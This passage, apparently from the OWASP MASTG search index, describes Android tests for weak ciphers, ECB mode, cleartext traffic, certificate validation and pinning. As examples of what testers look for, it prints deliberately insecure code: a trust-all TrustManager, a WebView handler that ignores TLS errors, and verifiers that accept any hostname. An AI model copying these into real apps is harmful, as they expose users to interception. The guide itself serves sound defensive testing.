<li>Blowfish: 64-bit block size, vulnerable to Sweet32 attacks, never FIPS-approved, and listed under \"Non-Approved algorithms\" in FIPS.</li> </ul> <p>Android also provides additional guidance on broken cryptographic algorithms.</p>","tags":["android","L1","L2","test","MASWE-0020"]},{"location":"MASTG/tests/android/MASVS-CRYPTO/MASTG-TEST-0221/#steps","title":"Steps","text":"<ol> <li>Run  Static Analysis on Android with a tool such as  semgrep on the app binary, or use  Method Tracing (dynamic analysis) with a tool like  Frida for Android, and look for uses of the cryptographic functions that perform encryption and decryption operations.</li> </ol>","tags":["android","L1","L2","test","MASWE-0020"]},{"location":"MASTG/tests/android/MASVS-CRYPTO/MASTG-TEST-0221/#observation","title":"Observation","text":"<p>The output should contain a list of locations where insecure symmetric encryption algorithms are used.</p>","tags":["android","L1","L2","test","MASWE-0020"]},{"location":"MASTG/tests/android/MASVS-CRYPTO/MASTG-TEST-0221/#evaluation","title":"Evaluation","text":"<p>The test case fails if you can find insecure or deprecated encryption algorithms being used.</p>","tags":["android","L1","L2","test","MASWE-0020"]},{"location":"MASTG/tests/android/MASVS-CRYPTO/MASTG-TEST-0221/#mitigations","title":"Mitigations","text":"<ul> <li> Use Secure Encryption Algorithms</li> </ul>","tags":["android","L1","L2","test","MASWE-0020"]},{"location":"MASTG/tests/android/MASVS-CRYPTO/MASTG-TEST-0221/#demos","title":"Demos","text":"<p> MASTG-DEMO-0022: Uses of Broken Symmetric Encryption Algorithms in Cipher with semgrep </p>","tags":["android","L1","L2","test","MASWE-0020"]},{"location":"MASTG/tests/android/MASVS-CRYPTO/MASTG-TEST-0232/","title":"MASTG-TEST-0232: Broken Symmetric Encryption Modes","text":"","tags":["android","L1","L2","test","MASWE-0020"]},{"location":"MASTG/tests/android/MASVS-CRYPTO/MASTG-TEST-0232/#overview","title":"Overview","text":"<p>To test for the use of broken encryption modes in Android apps, we need to focus on methods from cryptographic frameworks and libraries that are used to configure and apply encryption modes.</p> <p>In Android development, the <code>Cipher</code> class from the Java Cryptography Architecture (JCA) is the primary API that allows you to specify the encryption mode for cryptographic operations. <code>Cipher.getInstance</code> defines the transformation string, which includes the encryption algorithm, mode of operation, and padding scheme. The general format is <code>\"Algorithm/Mode/Padding\"</code>. For example:</p> <pre><code>Cipher.getInstance(\"AES/ECB/PKCS5Padding\")\n</code></pre> <p>In this test we're going to focus on symmetric encryption modes such as ECB (Electronic Codebook).</p> <p>ECB (defined in NIST SP 800-38A) is generally discouraged see NIST announcement in 2023 due to its inherent security weaknesses. While not explicitly prohibited, its use is limited and advised against in most scenarios. ECB is a block cipher mode that operate deterministically, dividing plaintext into blocks and encrypting them separately, which reveals patterns in the ciphertext. This makes it vulnerable to attacks like known-plaintext attacks and chosen-plaintext attacks.</p> <p>For example, the following transformations are all considered vulnerable:</p> <ul> <li><code>\"AES\"</code> (uses AES/ECB mode by default)</li> <li><code>\"AES/ECB/NoPadding\"</code></li> <li><code>\"AES/ECB/PKCS5Padding\"</code></li> <li><code>\"AES/ECB/ISO10126Padding\"</code></li> </ul> <p>You can learn more about ECB and other modes in NIST SP 800-38A - Recommendation for Block Cipher Modes of Operation: Methods and Techniques. Also check the Decision to Revise NIST SP 800-38A, Recommendation for Block Cipher Modes of Operation: Methods and Techniques and NIST IR 8459 Report on the Block Cipher Modes of Operation in the NIST SP 800-38 Series for the latest information.</p> <p>Out of Scope: Asymmetric encryption modes like RSA are out of scope for this test because they don't use block modes like ECB.</p> <p>In the transformation strings like <code>\"RSA/ECB/OAEPPadding\"</code> or <code>\"RSA/ECB/PKCS1Padding\"</code>, the inclusion of <code>ECB</code> in this context is misleading. Unlike symmetric ciphers, RSA doesn't operate in block modes like ECB. The <code>ECB</code> designation is a placeholder in some cryptographic APIs and doesn't imply that RSA uses ECB mode. Understanding these nuances helps prevent false positives.</p>","tags":["android","L1","L2","test","MASWE-0020"]},{"location":"MASTG/tests/android/MASVS-CRYPTO/MASTG-TEST-0232/#steps","title":"Steps","text":"<ol> <li>Run  Static Analysis on Android with a tool such as  semgrep on the app binary, or use  Method Tracing (dynamic analysis) with a tool like  Frida for Android, and look for cryptographic functions specifying the encryption mode to insecure modes.</li> </ol>","tags":["android","L1","L2","test","MASWE-0020"]},{"location":"MASTG/tests/android/MASVS-CRYPTO/MASTG-TEST-0232/#observation","title":"Observation","text":"<p>The output should contain a list of locations where broken encryption modes are used in cryptographic operations.</p>","tags":["android","L1","L2","test","MASWE-0020"]},{"location":"MASTG/tests/android/MASVS-CRYPTO/MASTG-TEST-0232/#evaluation","title":"Evaluation","text":"<p>The test case fails if any broken modes are identified in the app.</p>","tags":["android","L1","L2","test","MASWE-0020"]},{"location":"MASTG/tests/android/MASVS-CRYPTO/MASTG-TEST-0232/#mitigations","title":"Mitigations","text":"<ul> <li> Use Secure Encryption Modes</li> </ul>","tags":["android","L1","L2","test","MASWE-0020"]},{"location":"MASTG/tests/android/MASVS-CRYPTO/MASTG-TEST-0232/#demos","title":"Demos","text":"<p> MASTG-DEMO-0023: Uses of Broken Encryption Modes in Cipher with semgrep </p>","tags":["android","L1","L2","test","MASWE-0020"]},{"location":"MASTG/tests/android/MASVS-NETWORK/MASTG-TEST-0019/","title":"MASTG-TEST-0019: Testing Data Encryption on the Network","text":"<p>Deprecated Test</p> <p>This test is deprecated and should not be used anymore. Reason: New version available in MASTG V2</p> <p>Please check the following MASTG v2 tests that cover this v1 test:</p> <ul> <li> Hardcoded HTTP URLs</li> <li> Missing Implementation of Server Hostname Verification with SSLSockets</li> <li> Android App Configurations Allowing Cleartext Traffic</li> <li> Cleartext Traffic Observed on the Network</li> <li> Cross-Platform Framework Configurations Allowing Cleartext Traffic</li> <li> Runtime Use of Network APIs Transmitting Cleartext Traffic</li> <li> Using low-level APIs (e.g. Socket) to set up a custom HTTP connection</li> </ul>","tags":["android","L1","L2","test","MSTG-NETWORK-1","masvs-network-1","deprecated"]},{"location":"MASTG/tests/android/MASVS-NETWORK/MASTG-TEST-0019/#overview","title":"Overview","text":"","tags":["android","L1","L2","test","MSTG-NETWORK-1","masvs-network-1","deprecated"]},{"location":"MASTG/tests/android/MASVS-NETWORK/MASTG-TEST-0019/#static-analysis","title":"Static Analysis","text":"","tags":["android","L1","L2","test","MSTG-NETWORK-1","masvs-network-1","deprecated"]},{"location":"MASTG/tests/android/MASVS-NETWORK/MASTG-TEST-0019/#testing-network-requests-over-secure-protocols","title":"Testing Network Requests over Secure Protocols","text":"<p>First, you should identify all network requests in the source code and ensure that no plain HTTP URLs are used. Make sure that sensitive information is sent over secure channels by using <code>HttpsURLConnection</code> or <code>SSLSocket</code> (for socket-level communication using TLS).</p>","tags":["android","L1","L2","test","MSTG-NETWORK-1","masvs-network-1","deprecated"]},{"location":"MASTG/tests/android/MASVS-NETWORK/MASTG-TEST-0019/#testing-network-api-usage","title":"Testing Network API Usage","text":"<p>Next, even when using a low-level API which is supposed to make secure connections (such as <code>SSLSocket</code>), be aware that it has to be securely implemented. For instance, <code>SSLSocket</code> doesn't verify the hostname. Use <code>getDefaultHostnameVerifier</code> to verify the hostname. The Android developer documentation includes a code example.</p>","tags":["android","L1","L2","test","MSTG-NETWORK-1","masvs-network-1","deprecated"]},{"location":"MASTG/tests/android/MASVS-NETWORK/MASTG-TEST-0019/#testing-for-cleartext-traffic","title":"Testing for Cleartext Traffic","text":"<p>Next, you should ensure that the app is not allowing cleartext HTTP traffic. Since Android 9 (API level 28) cleartext HTTP traffic is blocked by default (thanks to the default Network Security Configuration) but there are multiple ways in which an application can still send it:</p> <ul> <li>Setting the <code>android:usesCleartextTraffic</code> attribute of the <code>&lt;application&gt;</code> tag in the AndroidManifest.xml file. Note that this flag is ignored in case the Network Security Configuration is configured.</li> <li>Configuring the Network Security Configuration to enable cleartext traffic by setting the <code>cleartextTrafficPermitted</code> attribute to true on <code>&lt;domain-config&gt;</code> elements.</li> <li>Using low-level APIs (e.g. <code>Socket</code>) to set up a custom HTTP connection.</li> <li>Using a cross-platform framework (e.g. Flutter, Xamarin, ...), as these typically have their own implementations for HTTP libraries.</li> </ul> <p>All of the above cases must be carefully analyzed as a whole. For example, even if the app does not permit cleartext traffic in its Android Manifest or Network Security Configuration, it might actually still be sending HTTP traffic. That could be the case if it's using a low-level API (for which Network Security Configuration is ignored) or a badly configured cross-platform framework.</p> <p>For more information refer to the article \"Security with HTTPS and SSL\".</p>","tags":["android","L1","L2","test","MSTG-NETWORK-1","masvs-network-1","deprecated"]},{"location":"MASTG/tests/android/MASVS-NETWORK/MASTG-TEST-0019/#dynamic-analysis","title":"Dynamic Analysis","text":"<p>Intercept the tested app's incoming and outgoing network traffic and make sure that this traffic is encrypted. You can intercept network traffic in any of the following ways:</p> <ul> <li>Capture all HTTP(S) and Websocket traffic with an interception proxy like  ZAP or  Burp Suite and make sure all requests are made via HTTPS instead of HTTP.</li> <li>Interception proxies like Burp and  ZAP will show web related traffic primarily (e.g. HTTP(S), Web Sockets, gRPC, etc.). You can, however, use a Burp plugin such as Burp-non-HTTP-Extension or the tool mitm-relay to decode and visualize communication via XMPP and other protocols.</li> </ul> <p>Some applications may not work with proxies like Burp and ZAP because of Certificate Pinning. In such a scenario, please check  Testing Custom Certificate Stores and Certificate Pinning.</p> <p>For more details refer to:</p> <ul> <li>\"Intercepting Network Traffic Through MITM\"</li> <li> Basic Network Monitoring/Sniffing</li> </ul>","tags":["android","L1","L2","test","MSTG-NETWORK-1","masvs-network-1","deprecated"]},{"location":"MASTG/tests/android/MASVS-NETWORK/MASTG-TEST-0020/","title":"MASTG-TEST-0020: Testing the TLS Settings","text":"<p>Deprecated Test</p> <p>This test is deprecated and should not be used anymore. Reason: New version available in MASTG V2</p> <p>Please check the following MASTG v2 tests that cover this v1 test:</p> <ul> <li> Insecure TLS Protocols Explicitly Allowed in Code</li> <li> Insecure TLS Protocols in Network Traffic</li> </ul>","tags":["android","L1","L2","test","MSTG-NETWORK-2","masvs-network-1","deprecated"]},{"location":"MASTG/tests/android/MASVS-NETWORK/MASTG-TEST-0020/#overview","title":"Overview","text":"<p>Refer to section \"Verifying the TLS Settings\" in chapter \"Mobile App Network Communication\" for details.</p>","tags":["android","L1","L2","test","MSTG-NETWORK-2","masvs-network-1","deprecated"]},{"location":"MASTG/tests/android/MASVS-NETWORK/MASTG-TEST-0021/","title":"MASTG-TEST-0021: Testing Endpoint Identify Verification","text":"<p>Deprecated Test</p> <p>This test is deprecated and should not be used anymore. Reason: New version available in MASTG V2</p> <p>Please check the following MASTG v2 tests that cover this v1 test:</p> <ul> <li> Unsafe Custom Trust Evaluation</li> <li> Incorrect Implementation of Server Hostname Verification</li> <li> Incorrect SSL Error Handling in WebViews</li> <li> Outdated Android Version Allowing Trust in User-Provided CAs</li> <li> Network Security Configuration Allowing Trust in User-Provided CAs</li> </ul>","tags":["android","L1","L2","test","MSTG-NETWORK-3","masvs-network-1","deprecated"]},{"location":"MASTG/tests/android/MASVS-NETWORK/MASTG-TEST-0021/#overview","title":"Overview","text":"","tags":["android","L1","L2","test","MSTG-NETWORK-3","masvs-network-1","deprecated"]},{"location":"MASTG/tests/android/MASVS-NETWORK/MASTG-TEST-0021/#static-analysis","title":"Static Analysis","text":"<p>Using TLS to transport sensitive information over the network is essential for security. However, encrypting communication between a mobile application and its backend API is not trivial. Developers often decide on simpler but less secure solutions (e.g., those that accept any certificate) to facilitate the development process, and sometimes these weak solutions make it into the production version, potentially exposing users to Machine-in-the-Middle (MITM) attacks. See \"CWE-295: Improper Certificate Validation\".</p> <p>Two key issues should be addressed:</p> <ul> <li>Verify that a certificate comes from a trusted source, i.e. a trusted CA (Certificate Authority).</li> <li>Determine whether the endpoint server presents the right certificate.</li> </ul> <p>Make sure that the hostname and the certificate itself are verified correctly. Examples and common pitfalls are available in the official Android documentation. Search the code for examples of <code>TrustManager</code> and <code>HostnameVerifier</code> usage. In the sections below, you can find examples of the kind of insecure usage that you should look for.</p> <p>Note that from Android 8.0 (API level 26) onward, there is no support for SSLv3 and <code>HttpsURLConnection</code> will no longer perform a fallback to an insecure TLS/SSL protocol.</p>","tags":["android","L1","L2","test","MSTG-NETWORK-3","masvs-network-1","deprecated"]},{"location":"MASTG/tests/android/MASVS-NETWORK/MASTG-TEST-0021/#verifying-the-target-sdk-version","title":"Verifying the Target SDK Version","text":"<p>Applications targeting Android 7.0 (API level 24) or higher will use a default Network Security Configuration that doesn't trust any user supplied CAs, reducing the possibility of MITM attacks by luring users to install malicious CAs.</p> <p>Decode the app using apktool ( Exploring the App Package) and verify that the <code>targetSdkVersion</code> in apktool.yml is equal to or higher than <code>24</code>.</p> <pre><code>grep targetSdkVersion UnCrackable-Level3/apktool.yml\n  targetSdkVersion: '28'\n</code></pre> <p>However, even if <code>targetSdkVersion &gt;=24</code>, the developer can disable default protections by using a custom Network Security Configuration defining a custom trust anchor forcing the app to trust user supplied CAs. See \"Analyzing Custom Trust Anchors\".</p>","tags":["android","L1","L2","test","MSTG-NETWORK-3","masvs-network-1","deprecated"]},{"location":"MASTG/tests/android/MASVS-NETWORK/MASTG-TEST-0021/#analyzing-custom-trust-anchors","title":"Analyzing Custom Trust Anchors","text":"<p>Search for the Network Security Configuration file and inspect any custom <code>&lt;trust-anchors&gt;</code> defining <code>&lt;certificates src=\"user\"&gt;</code> (which should be avoided).</p> <p>You should carefully analyze the precedence of entries:</p> <ul> <li>If a value is not set in a <code>&lt;domain-config&gt;</code> entry or in a parent <code>&lt;domain-config&gt;</code>, the configurations in place will be based on the <code>&lt;base-config&gt;</code></li> <li>If not defined in this entry, the default configurations will be used.</li> </ul> <p>Take a look at this example of a Network Security Configuration for an app targeting Android 9 (API level 28):</p> <pre><code>&lt;?xml version=\"1.0\" encoding=\"utf-8\"?&gt;\n&lt;network-security-config&gt;\n    &lt;domain-config&gt;\n        &lt;domain includeSubdomains=\"false\"&gt;owasp.org&lt;/domain&gt;\n        &lt;trust-anchors&gt;\n            &lt;certificates src=\"system\" /&gt;\n            &lt;certificates src=\"user\" /&gt;\n        &lt;/trust-anchors&gt;\n    &lt;/domain-config&gt;\n&lt;/network-security-config&gt;\n</code></pre> <p>Some observations:</p> <ul> <li>There's no <code>&lt;base-config&gt;</code>, meaning that the default configuration for Android 9 (API level 28) or higher will be used for all other connections (only <code>system</code> CA will be trusted in principle).</li> <li>However, the <code>&lt;domain-config&gt;</code> overrides the default configuration allowing the app to trust both <code>system</code> and <code>user</code> CAs for the indicated <code>&lt;domain&gt;</code> (owasp.org).</li> <li>This doesn't affect subdomains because of <code>includeSubdomains=\"false\"</code>.</li> </ul> <p>Putting all together we can translate the above Network Security Configuration to: \"the app trusts system and user CAs for the owasp.org domain, excluding its subdomains. For any other domains the app will trust the system CAs only\".</p>","tags":["android","L1","L2","test","MSTG-NETWORK-3","masvs-network-1","deprecated"]},{"location":"MASTG/tests/android/MASVS-NETWORK/MASTG-TEST-0021/#verifying-the-server-certificate","title":"Verifying the Server Certificate","text":"<p><code>TrustManager</code> is a means of verifying conditions necessary for establishing a trusted connection in Android. The following conditions should be checked at this point:</p> <ul> <li>Has the certificate been signed by a trusted CA?</li> <li>Has the certificate expired?</li> <li>Is the certificate self-signed?</li> </ul> <p>The following code snippet is sometimes used during development and will accept any certificate, overwriting the functions <code>checkClientTrusted</code>, <code>checkServerTrusted</code>, and <code>getAcceptedIssuers</code>. Such implementations should be avoided, and, if they are necessary, they should be clearly separated from production builds to avoid built-in security flaws.</p> <pre><code>TrustManager[] trustAllCerts = new TrustManager[] {\n    new X509TrustManager() {\n        @Override\n        public X509Certificate[] getAcceptedIssuers() {\n            return new java.security.cert.X509Certificate[] {};\n        }\n\n        @Override\n        public void checkClientTrusted(X509Certificate[] chain, String authType)\n            throws CertificateException {\n        }\n\n        @Override\n        public void checkServerTrusted(X509Certificate[] chain, String authType)\n            throws CertificateException {\n        }\n    }\n };\n\n// SSLContext context\ncontext.init(null, trustAllCerts, new SecureRandom());\n</code></pre>","tags":["android","L1","L2","test","MSTG-NETWORK-3","masvs-network-1","deprecated"]},{"location":"MASTG/tests/android/MASVS-NETWORK/MASTG-TEST-0021/#webview-server-certificate-verification","title":"WebView Server Certificate Verification","text":"<p>Sometimes applications use a WebView to render the website associated with the application. This is true of HTML/JavaScript-based frameworks such as Apache Cordova, which uses an internal WebView for application interaction. When a WebView is used, the mobile browser performs the server certificate validation. Ignoring any TLS error that occurs when the WebView tries to connect to the remote website is a bad practice.</p> <p>The following code will ignore TLS issues, exactly like the WebViewClient custom implementation provided to the WebView:</p> <pre><code>WebView myWebView = (WebView) findViewById(R.id.webview);\nmyWebView.setWebViewClient(new WebViewClient(){\n    @Override\n    public void onReceivedSslError(WebView view, SslErrorHandler handler, SslError error) {\n        //Ignore TLS certificate errors and instruct the WebViewClient to load the website\n        handler.proceed();\n    }\n});\n</code></pre>","tags":["android","L1","L2","test","MSTG-NETWORK-3","masvs-network-1","deprecated"]},{"location":"MASTG/tests/android/MASVS-NETWORK/MASTG-TEST-0021/#apache-cordova-certificate-verification","title":"Apache Cordova Certificate Verification","text":"<p>Implementation of the Apache Cordova framework's internal WebView usage will ignore TLS errors in the method <code>onReceivedSslError</code> if the flag <code>android:debuggable</code> is enabled in the application manifest. Therefore, make sure that the app is not debuggable. See the test case \"Testing If the App is Debuggable\".</p>","tags":["android","L1","L2","test","MSTG-NETWORK-3","masvs-network-1","deprecated"]},{"location":"MASTG/tests/android/MASVS-NETWORK/MASTG-TEST-0021/#hostname-verification","title":"Hostname Verification","text":"<p>Another security flaw in client-side TLS implementations is the lack of hostname verification. Development environments usually use internal addresses instead of valid domain names, so developers often disable hostname verification (or force an application to allow any hostname) and simply forget to change it when their application goes to production. The following code disables hostname verification:</p> <pre><code>final static HostnameVerifier NO_VERIFY = new HostnameVerifier() {\n    public boolean verify(String hostname, SSLSession session) {\n        return true;\n    }\n};\n</code></pre> <p>With a built-in <code>HostnameVerifier</code>, accepting any hostname is possible:</p> <pre><code>HostnameVerifier NO_VERIFY = org.apache.http.conn.ssl.SSLSocketFactory\n                             .ALLOW_ALL_HOSTNAME_VERIFIER;\n</code></pre> <p>Make sure that your application verifies a hostname before setting a trusted connection.</p>","tags":["android","L1","L2","test","MSTG-NETWORK-3","masvs-network-1","deprecated"]},{"location":"MASTG/tests/android/MASVS-NETWORK/MASTG-TEST-0021/#dynamic-analysis","title":"Dynamic Analysis","text":"<p>When testing an app targeting Android 7.0 (API level 24) or higher it should be effectively applying the Network Security Configuration and you shouldn't able to see the decrypted HTTPS traffic at first. However, if the app targets API levels below 24, the app will automatically accept the installed user certificates.</p> <p>To test improper certificate verification launch a MITM attack using an interception proxy such as Burp. Try the following options:</p> <ul> <li>Self-signed certificate:</li> <li>In Burp, go to the Proxy tab and select the Options tab.</li> <li>Go to the Proxy Listeners section, highlight your listener, and click Edit.</li> <li>Go to the Certificate tab, check Use a self-signed certificate, and click Ok.</li> <li>Run your application. If you're able to see HTTPS traffic, your application is accepting self-signed certificates.</li> <li>Accepting certificates with an untrusted CA:</li> <li>In Burp, go to the Proxy tab and select the Options tab.</li> <li>Go to the Proxy Listeners section, highlight your listener, and click Edit.</li> <li>Go to the Certificate tab, check Generate a CA-signed certificate with a specific hostname, and type in the backend server's hostname.</li> <li>Run your application. If you're able to see HTTPS traffic, your application is accepting certificates with an untrusted CA.</li> <li>Accepting incorrect hostnames:</li> <li>In Burp, go to the Proxy tab and select the Options tab.</li> <li>Go to the Proxy Listeners section, highlight your listener, and click Edit.</li> <li>Go to the Certificate tab, check Generate a CA-signed certificate with a specific hostname, and type in an invalid hostname, e.g., example.org.</li> <li>Run your application. If you're able to see HTTPS traffic, your application is accepting all hostnames.</li> </ul> <p>If you're still not able to see any decrypted HTTPS traffic, your application might be implementing certificate pinning.</p>","tags":["android","L1","L2","test","MSTG-NETWORK-3","masvs-network-1","deprecated"]},{"location":"MASTG/tests/android/MASVS-NETWORK/MASTG-TEST-0022/","title":"MASTG-TEST-0022: Testing Custom Certificate Stores and Certificate Pinning","text":"<p>Deprecated Test</p> <p>This test is deprecated and should not be used anymore. Reason: New version available in MASTG V2</p> <p>Please check the following MASTG v2 tests that cover this v1 test:</p> <ul> <li> Missing Certificate Pinning in Network Security Configuration</li> <li> Expired Certificate Pins in the Network Security Configuration</li> <li> Missing Certificate Pinning in Network Traffic</li> </ul>","tags":["android","L2","test","MSTG-NETWORK-4","masvs-network-2","deprecated"]},{"location":"MASTG/tests/android/MASVS-NETWORK/MASTG-TEST-0022/#overview","title":"Overview","text":"","tags":["android","L2","test","MSTG-NETWORK-4","masvs-network-2","deprecated"]},{"location":"MASTG/tests/android/MASVS-NETWORK/MASTG-TEST-0022/#static-analysis","title":"Static Analysis","text":"","tags":["android","L2","test","MSTG-NETWORK-4","masvs-network-2","deprecated"]},{"location":"MASTG/tests/android/MASVS-NETWORK/MASTG-TEST-0022/#network-security-configuration","title":"Network Security Configuration","text":"<p>Inspect the Network Security Configuration looking for any <code>&lt;pin-set&gt;</code> elements. Check their <code>expiration</code> date, if any. If expired, certificate pinning will be disabled for the affected domains.</p> <p>Testing Tip: If a certificate pinning validation check has failed, the following event should be logged in the system logs (see  Monitoring System Logs):</p> <pre><code>I/X509Util: Failed to validate the certificate chain, error: Pin verification failed\n</code></pre>","tags":["android","L2","test","MSTG-NETWORK-4","masvs-network-2","deprecated"]},{"location":"MASTG/tests/android/MASVS-NETWORK/MASTG-TEST-0022/#trustmanager","title":"TrustManager","text":"<p>Implementing certificate pinning involves three main steps:</p> <ul> <li>Obtain the certificate of the desired host(s).</li> <li>Make sure the certificate is in .bks format.</li> <li>Pin the certificate to an instance of the default Apache Httpclient.</li> </ul> <p>To analyze the correct implementation of certificate pinning, the HTTP client should load the KeyStore:</p> <pre><code>InputStream in = resources.openRawResource(certificateRawResource);\nkeyStore = KeyStore.getInstance(\"BKS\");\nkeyStore.load(resourceStream, password);\n</code></pre> <p>Once the KeyStore has been loaded, we can use the TrustManager that trusts the CAs in our KeyStore:</p> <pre><code>String tmfAlgorithm = TrustManagerFactory.getDefaultAlgorithm();\nTrustManagerFactory tmf = TrustManagerFactory.getInstance(tmfAlgorithm);\ntmf.init(keyStore);\n// Create an SSLContext that uses the TrustManager\n// SSLContext context = SSLContext.getInstance(\"TLS\");\nsslContext.init(null, tmf.getTrustManagers(), null);\n</code></pre> <p>The app's implementation may be different, pinning against the certificate's public key only, the whole certificate, or a whole certificate chain.</p>","tags":["android","L2","test","MSTG-NETWORK-4","masvs-network-2","deprecated"]},{"location":"MASTG/tests/android/MASVS-NETWORK/MASTG-TEST-0022/#network-libraries-and-webviews","title":"Network Libraries and WebViews","text":"<p>Applications that use third-party networking libraries may utilize the libraries' certificate pinning functionality. For example, okhttp can be set up with the <code>CertificatePinner</code> as follows:</p> <pre><code>OkHttpClient client = new OkHttpClient.Builder()\n        .certificatePinner(new CertificatePinner.Builder()\n            .add(\"example.com\", \"sha256/UwQAapahrjCOjYI3oLUx5AQxPBR02Jz6/E2pt0IeLXA=\")\n            .build())\n        .build();\n</code></pre> <p>Applications that use a WebView component may utilize the WebViewClient's event handler for some kind of \"certificate pinning\" of each request before the target resource is loaded. The following code shows an example verification:</p> <pre><code>WebView myWebView = (WebView) findViewById(R.id.webview);\nmyWebView.setWebViewClient(new WebViewClient(){\n    private String expectedIssuerDN = \"CN=Let's Encrypt Authority X3,O=Let's Encrypt,C=US;\";\n\n    @Override\n    public void onLoadResource(WebView view, String url)  {\n        //From Android API documentation about \"WebView.getCertificate()\":\n        //Gets the SSL certificate for the main top-level page\n        //or null if there is no certificate (the site is not secure).\n        //\n        //Available information on SslCertificate class are \"Issuer DN\", \"Subject DN\" and validity date helpers\n        SslCertificate serverCert = view.getCertificate();\n        if(serverCert != null){\n            //apply either certificate or public key pinning comparison here\n                //Throw exception to cancel resource loading...\n            }\n        }\n    }\n});\n</code></pre> <p>Alternatively, it is better to use an OkHttpClient with configured pins and let it act as a proxy overriding <code>shouldInterceptRequest</code> of the <code>WebViewClient</code>.</p>","tags":["android","L2","test","MSTG-NETWORK-4","masvs-network-2","deprecated"]},{"location":"MASTG/tests/android/MASVS-NETWORK/MASTG-TEST-0022/#xamarin-applications","title":"Xamarin Applications","text":"<p>Applications developed in Xamarin will typically use <code>ServicePointManager</code> to implement pinning.</p> <p>Normally a function is created to check the certificate(s) and return the boolean value to the method <code>ServerCertificateValidationCallback</code>:</p> <pre><code>[Activity(Label = \"XamarinPinning\", MainLauncher = true)]\n    public class MainActivity : Activity\n    {\n        // SupportedPublicKey - Hexadecimal value of the public key.\n        // Use GetPublicKeyString() method to determine the public key of the certificate we want to pin. Uncomment the debug code in the ValidateServerCertificate function a first time to determine the value to pin.\n        private const string SupportedPublicKey = \"3082010A02820101009CD30CF05AE52E47B7725D3783B...\"; // Shortened for readability\n\n        private static bool ValidateServerCertificate(\n                object sender,\n                X509Certificate certificate,\n                X509Chain chain,\n                SslPolicyErrors sslPolicyErrors\n            )\n        {\n            //Log.Debug(\"Xamarin Pinning\",chain.ChainElements[X].Certificate.GetPublicKeyString());\n            //return true;\n            return SupportedPublicKey == chain.ChainElements[1].Certificate.GetPublicKeyString();\n        }\n\n        protected override void OnCreate(Bundle savedInstanceState)\n        {\n            System.Net.ServicePointManager.ServerCertificateValidationCallback += ValidateServerCertificate;\n            base.OnCreate(savedInstanceState);\n            SetContentView(Resource.Layout.Main);\n            TesteAsync(\"https://security.claudio.pt\");\n\n        }\n</code></pre> <p>In this particular example we are pinning the intermediate CA of the certificate chain. The output of the HTTP response will be available in the system logs.</p> <p>Sample Xamarin app with the previous example can be obtained on the MASTG repository</p> <p>After decompressing the APK file, use a .NET decompiler like dotPeak, ILSpy or dnSpy to decompile the app dlls stored inside the 'Assemblies' folder and confirm the usage of the ServicePointManager.</p> <p>Learn more:</p> <ul> <li>Certificate and Public Key Pinning with Xamarin - https://thomasbandt.com/certificate-and-public-key-pinning-with-xamarin</li> <li>ServicePointManager - https://msdn.microsoft.com/en-us/library/system.net.servicepointmanager(v=vs.110).aspx</li> </ul>","tags":["android","L2","test","MSTG-NETWORK-4","masvs-network-2","deprecated"]},{"location":"MASTG/tests/android/MASVS-NETWORK/MASTG-TEST-0022/#cordova-applications","title":"Cordova Applications","text":"<p>Hybrid applications based on Cordova do not support Certificate Pinning natively, so plugins are used to achieve this. The most common one is PhoneGap SSL Certificate Checker. The <code>check</code> method is used to confirm the fingerprint and callbacks will determine the next steps.</p> <pre><code>  // Endpoint to verify against certificate pinning.\n  var server = \"https://www.owasp.org\";\n  // SHA256 Fingerprint (Can be obtained via \"openssl s_client -connect hostname:443 | openssl x509 -noout -fingerprint -sha256\"\n  var fingerprint = \"D8 EF 3C DF 7E F6 44 BA 04 EC D5 97 14 BB 00 4A 7A F5 26 63 53 87 4E 76 67 77 F0 F4 CC ED 67 B9\";\n\n  window.plugins.sslCertificateChecker.check(\n          successCallback,\n          errorCallback,\n          server,\n          fingerprint);\n\n   function successCallback(message) {\n     alert(message);\n     // Message is always: CONNECTION_SECURE.\n     // Now do something with the trusted server.\n   }\n\n   function errorCallback(message) {\n     alert(message);\n     if (message === \"CONNECTION_NOT_SECURE\") {\n       // There is likely a MITM attack going on, be careful!\n     } else if (message.indexOf(\"CONNECTION_FAILED\") &gt;- 1) {\n       // There was no connection (yet). Internet may be down. Try again (a few times) after a little timeout.\n     }\n   }\n</code></pre> <p>After decompressing the APK file, Cordova/Phonegap files will be located in the /assets/www folder. The 'plugins' folder will give you the visibility of the plugins used. We will need to search for this methods in the JavaScript code of the application to confirm its usage.</p>","tags":["android","L2","test","MSTG-NETWORK-4","masvs-network-2","deprecated"]},{"location":"MASTG/tests/android/MASVS-NETWORK/MASTG-TEST-0022/#dynamic-analysis","title":"Dynamic Analysis","text":"<p>Follow the instructions from  Testing Endpoint Identify Verification. If doing so doesn't lead to traffic being proxied, it may mean that certificate pinning is actually implemented and all security measures are in place. Does the same happen for all domains?</p> <p>As a quick smoke test, you can try to bypass certificate pinning using  objection as described in  Bypassing Certificate Pinning. Pinning related APIs being hooked by objection should appear in objection's output.</p> <p></p> <p>However, keep in mind that:</p> <ul> <li>the APIs might not be complete.</li> <li>if nothing is hooked, that doesn't necessarily mean that the app doesn't implement pinning.</li> </ul> <p>In both cases, the app or some of its components might implement custom pinning in a way that is supported by objection. Please check the static analysis section for specific pinning indicators and more in-depth testing.</p>","tags":["android","L2","test","MSTG-NETWORK-4","masvs-network-2","deprecated"]},{"location":"MASTG/tests/android/MASVS-NETWORK/MASTG-TEST-0023/","title":"MASTG-TEST-0023: Testing the Security Provider","text":"<p>This test will be updated soon</p> <p>The test can be used in its current form, but it will receive a complete overhaul as part of the new OWASP MASTG v2 guidelines.</p> <p>Help us out by submitting a PR for: MASTG v1-&gt;v2 MASTG-TEST-0023: Testing the Security Provider (android)</p> <p> Send Feedback</p>","tags":["android","L2","test","MSTG-NETWORK-6","masvs-network-1"]},{"location":"MASTG/tests/android/MASVS-NETWORK/MASTG-TEST-0023/#overview","title":"Overview","text":"","tags":["android","L2","test","MSTG-NETWORK-6","masvs-network-1"]},{"location":"MASTG/tests/android/MASVS-NETWORK/MASTG-TEST-0023/#static-analysis","title":"Static Analysis","text":"<p>Applications based on the Android SDK should depend on GooglePlayServices. For example, in the gradle build file, you will find <code>compile 'com.google.android.gms:play-services-gcm:x.x.x'</code> in the dependencies block. You need to make sure that the <code>ProviderInstaller</code> class is called with either <code>installIfNeeded</code> or <code>installIfNeededAsync</code>. <code>ProviderInstaller</code> needs to be called by a component of the application as early as possible. Exceptions thrown by these methods should be caught and handled correctly. If the application cannot patch its  Security Provider, it can either inform the API of its less secure state or restrict user actions (because all HTTPS traffic should be deemed riskier in this situation).</p> <p>If you have access to the source code, check if the app handle any exceptions related to the 